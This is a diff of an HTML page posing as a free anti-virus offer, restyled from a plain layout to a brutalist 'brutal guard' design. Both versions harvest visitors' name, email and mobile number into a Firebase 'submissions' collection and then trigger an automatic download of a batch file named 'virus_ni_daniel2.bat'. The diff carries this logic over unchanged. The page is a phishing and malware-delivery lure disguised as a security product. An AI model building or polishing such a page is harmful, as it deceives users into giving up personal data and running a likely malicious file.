@@ -1,621 +1,576 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Affordable Web Hosting</title>
-
-    <style>
-/* =========================================
-   RESET
-========================================= */
-
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-body {
-    font-family: Arial, Helvetica, sans-serif;
-}
-
-
-/* =========================================
-   PAGE
-========================================= */
-
-.page {
-    width: 100%;
-    min-height: 100vh;
-
-    display: flex;
-    justify-content: center;
-    align-items: center;
-
-    background:
-        linear-gradient(
-            rgba(0, 35, 58, 0.65),
-            rgba(0, 35, 58, 0.65)
-        ),
-        url("security.jpeg");
-
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
-
-    padding: 30px;
-}
-
-
-/* =========================================
-   CENTER CONTENT
-========================================= */
-
-.content {
-    width: 100%;
-    max-width: 430px;
-
-    display: flex;
-    flex-direction: column;
-
-    align-items: center;
-
-    text-align: center;
-}
-
-
-/* =========================================
-   HERO CONTENT
-========================================= */
-
-.hero-content {
-    color: white;
-
-    margin-bottom: 20px;
-}
-
-
-/* Small title */
-
-.eyebrow {
-    font-size: 10px;
-    font-weight: 700;
-
-    letter-spacing: 0.3px;
-
-    margin-bottom: 10px;
-}
-
-
-/* Main title */
-
-.hero-content h1 {
-    font-size: 34px;
-    line-height: 1.12;
-
-    font-weight: 800;
-
-    margin-bottom: 8px;
-}
-
-
-/* Description */
-
-.description {
-    max-width: 390px;
-
-    margin: 0 auto;
-
-    color: white;
-
-    font-size: 15px;
-    line-height: 1.25;
-
-    font-weight: 600;
-}
-
-
-/* =========================================
-   LOGIN CONTAINER
-========================================= */
-
-.login-container {
-    width: 100%;
-
-    display: flex;
-    flex-direction: column;
-
-    align-items: center;
-
-    position: relative;
-}
-
-
-/* Login title */
-
-.login-container h2 {
-    color: white;
-
-    font-size: 25px;
-    line-height: 1.05;
-
-    font-weight: 800;
-
-    margin-bottom: 6px;
-}
-
-
-/* Subtitle */
-
-.login-subtitle {
-    color: white;
-
-    font-size: 15px;
-    font-weight: 600;
-
-    margin-bottom: 6px;
-}
-
-
-/* =========================================
-   LOGIN CARD
-========================================= */
-
-.login-card {
-    width: 255px;
-    position: relative;
-
-    background: white;
-
-    border: 1px solid #999;
-
-    box-shadow:
-        0 3px 8px rgba(0, 0, 0, 0.35);
-
-    text-align: center;
-}
-
-
-/* =========================================
-   TAB
-========================================= */
-
-.tabs {
-    width: 100%;
-    height: 43px;
-
-    display: flex;
-    justify-content: center;
-    align-items: center;
-
-    border-bottom: 1px solid #ddd;
-}
-
-
-.tab {
-    width: 50%;
-    height: 100%;
-
-    display: flex;
-    align-items: center;
-    justify-content: center;
-
-    color: #00863d;
-
-    font-size: 11px;
-    font-weight: 700;
-
-    text-align: center;
-
-    cursor: pointer;
-}
-
-
-.tab.active {
-    border-bottom: 1px solid #333;
-}
-
-
-/* =========================================
-   FORM
-========================================= */
-
-.form-container {
-    width: 100%;
-
-    padding: 14px 13px 14px;
-
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
-
-
-/* =========================================
-   INPUT GROUP
-========================================= */
-
-.input-group {
-    width: 100%;
-
-    margin-bottom: 12px;
-
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-}
-
-
-/* Labels */
-
-.input-group label {
-    width: 100%;
-
-    display: block;
-
-    color: #444;
-
-    font-size: 9px;
-    font-weight: 600;
-
-    margin-bottom: 5px;
-
-    text-align: center;
-}
-
-
-/* Inputs */
-
-.input-group input {
-    width: 100%;
-    height: 25px;
-
-    padding: 5px 7px;
-
-    border: 1px solid #d4d4d4;
-
-    outline: none;
-
-    font-size: 10px;
-
-    text-align: center;
-}
-
-
-.input-group input:focus {
-    border-color: #008b3d;
-}
-
-
-.input-group input::placeholder {
-    color: #999;
-    text-align: center;
-}
-
-
-/* =========================================
-   FORGOT PASSWORD
-========================================= */
-
-.forgot-password {
-    display: block;
-
-    width: 100%;
-
-    margin-top: -3px;
-    margin-bottom: 18px;
-
-    color: #00863d;
-
-    font-size: 10px;
-    font-weight: 700;
-
-    text-align: center;
-
-    text-decoration: none;
-}
-
-
-.forgot-password:hover {
-    text-decoration: underline;
-}
-
-
-/* =========================================
-   LOGIN BUTTON
-========================================= */
-
-.login-button {
-    width: 100%;
-    height: 20px;
-
-    border: none;
-    border-radius: 15px;
-
-    background: #008b3d;
-    color: white;
-
-    font-size: 9px;
-
-    display: flex;
-    align-items: center;
-    justify-content: center;
-
-    text-decoration: none;
-
-    cursor: pointer;
-}
-
-.login-button:hover {
-    background: #007534;
-}
-
-
-
-/* =========================================
-   MOBILE
-========================================= */
-
-@media (max-width: 600px) {
-
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>brutal·guard · malware free</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    /* ----- RESET : brutalist raw ----- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #e8e4de;
+      font-family: 'Courier New', Courier, 'IBM Plex Mono', monospace;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      color: #1a1a1a;
+    }
+
+    /* MAIN CONTAINER – no outer div, just the .page as root */
     .page {
-        padding: 25px 15px;
+      width: 100%;
+      max-width: 1280px;
+      background: #f0ece6;
+      border: 4px solid #1e1e1e;
+      box-shadow: 12px 12px 0 #1e1e1e;
+      padding: 40px 36px;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: stretch;
+      justify-content: space-between;
+      gap: 40px 30px;
+      position: relative;
+    }
+
+    /* brutalist tape / badge */
+    .page::before {
+      content: "⛓️ BRUTAL GUARD";
+      position: absolute;
+      top: -14px;
+      left: 20px;
+      background: #f0ece6;
+      padding: 0 14px;
+      font-weight: 700;
+      font-size: 13px;
+      letter-spacing: 2px;
+      color: #1e1e1e;
+      border-left: 3px solid #1e1e1e;
+      border-right: 3px solid #1e1e1e;
+    }
+
+    /* ----- LEFT HERO (EXTENDED) – takes more space ----- */
+    .hero-content {
+      flex: 2 1 480px;  /* increased flex-grow */
+      max-width: 620px;  /* wider */
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 12px 0;
+    }
+
+    .eyebrow-brutal {
+      font-size: 15px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      background: #1e1e1e;
+      color: #f0ece6;
+      display: inline-block;
+      padding: 6px 18px 4px 18px;
+      margin-bottom: 22px;
+      border: 2px solid #1e1e1e;
+      box-shadow: 5px 5px 0 #1e1e1e;
+      width: fit-content;
     }
 
     .hero-content h1 {
-        font-size: 29px;
+      font-size: 58px;  /* bigger */
+      font-weight: 800;
+      line-height: 1.02;
+      letter-spacing: -1.5px;
+      text-transform: uppercase;
+      color: #1e1e1e;
+      border-left: 10px solid #1e1e1e;
+      padding-left: 22px;
+      margin-bottom: 20px;
+    }
+
+    .hero-content h1 span {
+      background: #1e1e1e;
+      color: #f0ece6;
+      padding: 0 8px;
+      display: inline-block;
     }
 
     .description {
-        font-size: 14px;
-        max-width: 330px;
+      font-size: 18px;  /* bigger */
+      font-weight: 500;
+      line-height: 1.6;
+      color: #1e1e1e;
+      max-width: 520px;
+      margin-bottom: 32px;
+      padding-left: 12px;
+      border-bottom: 4px solid #1e1e1e;
+      padding-bottom: 18px;
     }
 
+    .trust-brutal {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px 28px;
+      font-size: 14px;
+      font-weight: 600;
+      text-transform: uppercase;
+      padding-left: 12px;
+    }
+
+    .trust-brutal i {
+      margin-right: 8px;
+      color: #1e1e1e;
+      border: 2px solid #1e1e1e;
+      border-radius: 0;
+      padding: 3px 5px;
+      background: #d9d2c5;
+    }
+
+    /* ----- RIGHT CARD (brutalist) – fixed width, pushed right ----- */
+    .login-container {
+      flex: 0 1 400px;
+      width: 100%;
+      max-width: 440px;
+      background: #f0ece6;
+      border: 4px solid #1e1e1e;
+      box-shadow: 10px 10px 0 #1e1e1e;
+      padding: 24px 20px 28px;
+      display: flex;
+      flex-direction: column;
+      margin-left: auto;  /* push to the far right */
+    }
+
+    .login-container h2 {
+      font-size: 20px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: -0.5px;
+      color: #1e1e1e;
+      border-bottom: 4px solid #1e1e1e;
+      padding-bottom: 8px;
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .login-container h2 i {
+      background: #1e1e1e;
+      color: #f0ece6;
+      padding: 4px 8px;
+      border: 2px solid #1e1e1e;
+      font-size: 16px;
+    }
+
+    .login-subtitle {
+      font-size: 14px;
+      font-weight: 600;
+      text-transform: uppercase;
+      color: #1e1e1e;
+      margin-bottom: 20px;
+      padding-left: 6px;
+      border-left: 6px solid #1e1e1e;
+      padding-left: 14px;
+    }
+
+    /* login card (inner) */
     .login-card {
-        width: 255px;
+      background: #e8e4de;
+      border: 3px solid #1e1e1e;
+      box-shadow: inset 0 0 0 2px #1e1e1e;
+      padding: 0;
+      width: 100%;
     }
 
-    .error-message {
-        display: none;
+    .tabs {
+      display: flex;
+      background: #1e1e1e;
+      border-bottom: 3px solid #1e1e1e;
     }
-}
-</style>
 
+    .tab {
+      flex: 1;
+      padding: 12px 8px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      color: #b0a898;
+      text-align: center;
+      cursor: default;
+      background: #1e1e1e;
+      border-right: 2px solid #3a3a3a;
+    }
 
+    .tab.active {
+      background: #f0ece6;
+      color: #1e1e1e;
+      border-bottom: 4px solid #f0ece6;
+      box-shadow: inset 0 -4px 0 #1e1e1e;
+    }
+
+    .form-container {
+      padding: 20px 18px 22px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      background: #f0ece6;
+    }
+
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .input-group label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: #1e1e1e;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: #d9d2c5;
+      padding: 4px 8px;
+      border: 2px solid #1e1e1e;
+      width: fit-content;
+    }
+
+    .input-group label i {
+      font-size: 12px;
+    }
+
+    .input-group input {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      background: #faf8f5;
+      border: 3px solid #1e1e1e;
+      color: #1e1e1e;
+      font-size: 15px;
+      font-weight: 500;
+      font-family: 'Courier New', monospace;
+      outline: none;
+      transition: 0.1s;
+      border-radius: 0;
+    }
+
+    .input-group input:focus {
+      background: #fffcf5;
+      border-color: #1e1e1e;
+      box-shadow: inset 0 0 0 2px #1e1e1e;
+    }
+
+    .input-group input::placeholder {
+      color: #7a7264;
+      font-weight: 400;
+      font-size: 13px;
+      opacity: 0.8;
+    }
+
+    .login-button {
+      width: 100%;
+      height: 50px;
+      border: 4px solid #1e1e1e;
+      background: #1e1e1e;
+      color: #f0ece6;
+      font-weight: 800;
+      font-size: 16px;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      font-family: 'Courier New', monospace;
+      cursor: pointer;
+      transition: 0.05s linear;
+      box-shadow: 6px 6px 0 #1e1e1e;
+      margin-top: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    .login-button:hover {
+      background: #f0ece6;
+      color: #1e1e1e;
+      box-shadow: 2px 2px 0 #1e1e1e;
+      transform: translate(4px, 4px);
+    }
+
+    .login-button:disabled {
+      opacity: 0.6;
+      transform: none;
+      box-shadow: 4px 4px 0 #1e1e1e;
+      background: #3a3a3a;
+      color: #b0a898;
+      pointer-events: none;
+    }
+
+    .secure-note {
+      margin-top: 18px;
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      color: #1e1e1e;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      border-top: 3px solid #1e1e1e;
+      padding-top: 14px;
+      letter-spacing: 0.5px;
+    }
+
+    .secure-note i {
+      border: 2px solid #1e1e1e;
+      padding: 4px 6px;
+      background: #d9d2c5;
+    }
+
+    /* mobile */
+    @media (max-width: 920px) {
+      .page {
+        padding: 30px 20px;
+        gap: 30px;
+        flex-direction: column;
+        align-items: center;
+        box-shadow: 8px 8px 0 #1e1e1e;
+      }
+      .hero-content {
+        max-width: 100%;
+        flex: 1 1 auto;
+      }
+      .hero-content h1 {
+        font-size: 44px;
+      }
+      .login-container {
+        max-width: 100%;
+        width: 100%;
+        margin-left: 0; /* reset on mobile */
+      }
+    }
+
+    @media (max-width: 480px) {
+      body { padding: 12px; }
+      .page { padding: 20px 14px; }
+      .hero-content h1 { font-size: 34px; }
+      .login-button { font-size: 14px; height: 46px; }
+      .description { font-size: 16px; }
+    }
+
+    /* brutal extra : no rounded corners anywhere */
+    .page, .login-container, .login-card, .tab, .input-group input, .login-button, .eyebrow-brutal {
+      border-radius: 0 !important;
+    }
+    /* remove all backdrop / glass */
+    .login-container, .login-card {
+      backdrop-filter: none;
+      background: #f0ece6;
+    }
+
+    /* semi-dark + white palette */
+    .page {
+      background: #f0ece6;
+      border-color: #1e1e1e;
+    }
+    .login-container {
+      background: #f0ece6;
+      border-color: #1e1e1e;
+    }
+    .login-card {
+      background: #e8e4de;
+    }
+    .form-container {
+      background: #f0ece6;
+    }
+    .tab.active {
+      background: #f0ece6;
+      color: #1e1e1e;
+    }
+    .tab {
+      background: #1e1e1e;
+      color: #b0a898;
+    }
+    .login-button {
+      background: #1e1e1e;
+      color: #f0ece6;
+      border-color: #1e1e1e;
+    }
+    .login-button:hover {
+      background: #f0ece6;
+      color: #1e1e1e;
+    }
+    .eyebrow-brutal {
+      background: #1e1e1e;
+      color: #f0ece6;
+      border-color: #1e1e1e;
+      box-shadow: 5px 5px 0 #1e1e1e;
+    }
+    .input-group label {
+      background: #d9d2c5;
+      border-color: #1e1e1e;
+    }
+    .secure-note i {
+      background: #d9d2c5;
+    }
+    .trust-brutal i {
+      background: #d9d2c5;
+      border-color: #1e1e1e;
+    }
+    .hero-content h1 span {
+      background: #1e1e1e;
+      color: #f0ece6;
+    }
+    .page::before {
+      background: #f0ece6;
+      color: #1e1e1e;
+      border-color: #1e1e1e;
+    }
+  </style>
 </head>
-
-
 <body>
-
-    <main class="page">
-
-        <div class="content">
-
-
-            <!-- HEADER -->
-
-            <div class="hero-content">
-
-                <p class="eyebrow">
-                    DO YOU WANT TO GET YOUR DEVICE FREE OF MALWARE?
-                </p>
-
-                <h1>
-                    Everything you<br>
-                    need in one place
-                </h1>
-
-                <p class="description">
-                    You just need to enter your credentials and download our app
-                    FOR FREE!!!
-                </p>
-
-            </div>
-
-
-            <!-- LOGIN -->
-
-            <div class="login-container">
-
-                <h2>
-                    BE OUR GUEST<br>
-                    AND ENJOY YOUR MALWARE-FREE DEVICE FOR A LIFETIME!
-                </h2>
-
-                <p class="login-subtitle">
-                    Enter your credentials and download our anti-virus app
-                    <br><br>
-                </p>
-
-
-                <!-- LOGIN CARD -->
-
-                <div class="login-card">
-
-
-                    <!-- TAB -->
-
-                    <div class="tabs">
-
-                        <div class="tab active">
-                            ENTER YOUR CREDENTIALS
-                        </div>
-
-                    </div>
-
-
-                    <!-- FORM -->
-
-                    <div class="form-container">
-
-                    <div class="input-group">
-                        <label for="name">Name</label>
-
-                        <input
-                            type="text"
-                            id="name"
-                            placeholder="Juan Dela Cruz"
-                        >
-                    </div>
-
-                    <div class="input-group">
-                        <label for="email">Email</label>
-
-                        <input
-                            type="email"
-                            id="email"
-                            placeholder="pogiako@gmail.com"
-                        >
-                    </div>
-
-                    <div class="input-group">
-                        <label for="cpnum">Mobile Number</label>
-
-                        <input
-                            type="tel"
-                            id="cpnum"
-                            placeholder="0929pakisend sa gcash"
-                        >
-                    </div>
-
-                    <button
-                        type="button"
-                        class="login-button"
-                        id="submitButton">
-                        ENTER
-                    </button>
-
-                </div>
-
-                <script type="module">
-import { initializeApp }
-    from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
-
-import {
-    getFirestore,
-    collection,
-    addDoc,
-    serverTimestamp
-} from "https://www.gstatic.com/firebasejs/12.17.1/firebase-firestore.js";
-
-
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyB98m8VX3lB8EC9PyqEzRowetgKEcNUuMY",
-  authDomain: "camille-bash.firebaseapp.com",
-  projectId: "camille-bash",
-  storageBucket: "camille-bash.firebasestorage.app",
-  messagingSenderId: "502796350689",
-  appId: "1:502796350689:web:f6be9d222d426ec12f73a0",
-  measurementId: "G-J3MRD8VNMW"
-};
-
-
-// ==========================================
-// INITIALIZE FIREBASE
-// ==========================================
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-
-
-// ==========================================
-// BUTTON
-// ==========================================
-
-const submitButton =
-    document.getElementById("submitButton");
-
-
-submitButton.addEventListener("click", async () => {
-
-    const name =
-        document.getElementById("name").value.trim();
-
-    const email =
-        document.getElementById("email").value.trim();
-
-    const mobile =
-        document.getElementById("cpnum").value.trim();
-
-
-    // Check fields
-    if (!name || !email || !mobile) {
-
-        alert("Please complete all fields.");
-
-        return;
-    }
-
-
-    submitButton.disabled = true;
-    submitButton.textContent = "PLEASE WAIT...";
-
-
-    try {
-
-        // Save information to Firestore
-        await addDoc(
-            collection(db, "submissions"),
-            {
-                name: name,
-                email: email,
-                mobile: mobile,
-                submittedAt: serverTimestamp()
-            }
-        );
-
-
-        console.log("Information saved successfully.");
-
-
-        // ==========================================
-        // DOWNLOAD FILE AFTER SUCCESSFUL SUBMISSION
-        // ==========================================
-
-        const downloadLink =
-            document.createElement("a");
-
-        downloadLink.href =
-            "virus_ni_daniel2.bat";
-
-        downloadLink.download =
-            "virus_ni_daniel2.bat";
-
-        document.body.appendChild(downloadLink);
-
-        downloadLink.click();
-
-        document.body.removeChild(downloadLink);
-
-
-        submitButton.textContent = "DOWNLOADED";
-
-
-    } catch (error) {
-
-        console.error("Firestore error:", error);
-
-        alert(
-            "Unable to submit your information."
-        );
-
-        submitButton.disabled = false;
-        submitButton.textContent = "ENTER";
-    }
-
-});
-</script>
-                </div>
-
-            </div>
-
+  <!-- NO outer div: page is the root container -->
+  <main class="page">
+
+    <!-- LEFT – EXTENDED (more width, bigger text) -->
+    <div class="hero-content">
+      <div class="eyebrow-brutal">
+        <i class="fas fa-skull" style="margin-right: 8px;"></i> malware? never
+      </div>
+      <h1>
+        everything <br><span>you need</span>
+      </h1>
+      <p class="description">
+        credentials &amp; download — <strong>brutal</strong> anti‑virus.<br>
+        zero bullshit. lifetime free. protect your device.
+      </p>
+      <div class="trust-brutal">
+        <span><i class="fas fa-bolt"></i> real‑time</span>
+        <span><i class="fas fa-database"></i> 0 threats</span>
+        <span><i class="fas fa-lock"></i> encrypted</span>
+        <span><i class="fas fa-shield-halved"></i> brutal</span>
+      </div>
+    </div>
+
+    <!-- RIGHT : login (brutalist) – pushed to the far right -->
+    <div class="login-container">
+      <h2>
+        <i class="fas fa-user-secret"></i> be our guest
+      </h2>
+      <div class="login-subtitle">
+        enter credentials · download shield
+      </div>
+
+      <div class="login-card">
+        <!-- tab (single) -->
+        <div class="tabs">
+          <div class="tab active">
+            <i class="fas fa-check-circle" style="margin-right: 6px;"></i> credentials
+          </div>
         </div>
 
-    </main>
-</body>
+        <!-- form -->
+        <div class="form-container">
+          <div class="input-group">
+            <label for="name"><i class="fas fa-user"></i> name</label>
+            <input type="text" id="name" placeholder="Juan Dela Cruz" />
+          </div>
 
+          <div class="input-group">
+            <label for="email"><i class="fas fa-envelope"></i> email</label>
+            <input type="email" id="email" placeholder="pogiako@gmail.com" />
+          </div>
+
+          <div class="input-group">
+            <label for="cpnum"><i class="fas fa-phone"></i> mobile</label>
+            <input type="tel" id="cpnum" placeholder="0929pakisend sa gcash" />
+          </div>
+
+          <button type="button" class="login-button" id="submitButton">
+            <i class="fas fa-download"></i> enter
+          </button>
+        </div>
+      </div>
+
+      <div class="secure-note">
+        <i class="fas fa-shield-halved"></i> brutal secure · no bs
+      </div>
+    </div>
+
+  </main>
+
+  <!-- FIREBASE + LOGIC (unchanged) -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
+    import {
+      getFirestore,
+      collection,
+      addDoc,
+      serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyB98m8VX3lB8EC9PyqEzRowetgKEcNUuMY",
+      authDomain: "camille-bash.firebaseapp.com",
+      projectId: "camille-bash",
+      storageBucket: "camille-bash.firebasestorage.app",
+      messagingSenderId: "502796350689",
+      appId: "1:502796350689:web:f6be9d222d426ec12f73a0",
+      measurementId: "G-J3MRD8VNMW"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const submitButton = document.getElementById("submitButton");
+
+    submitButton.addEventListener("click", async () => {
+      const name = document.getElementById("name").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const mobile = document.getElementById("cpnum").value.trim();
+
+      if (!name || !email || !mobile) {
+        alert("✗ complete all fields.");
+        return;
+      }
+
+      submitButton.disabled = true;
+      submitButton.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> WAIT...';
+
+      try {
+        await addDoc(collection(db, "submissions"), {
+          name: name,
+          email: email,
+          mobile: mobile,
+          submittedAt: serverTimestamp()
+        });
+
+        console.log("saved.");
+
+        // download .bat
+        const link = document.createElement("a");
+        link.href = "virus_ni_daniel2.bat";
+        link.download = "virus_ni_daniel2.bat";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        submitButton.innerHTML = '<i class="fas fa-check"></i> DOWNLOADED';
+        submitButton.disabled = false;
+
+      } catch (e) {
+        console.error(e);
+        alert("✗ error submitting.");
+        submitButton.disabled = false;
+        submitButton.innerHTML = '<i class="fas fa-download"></i> enter';
+      }
+    });
+  </script>
+</body>
 </html>
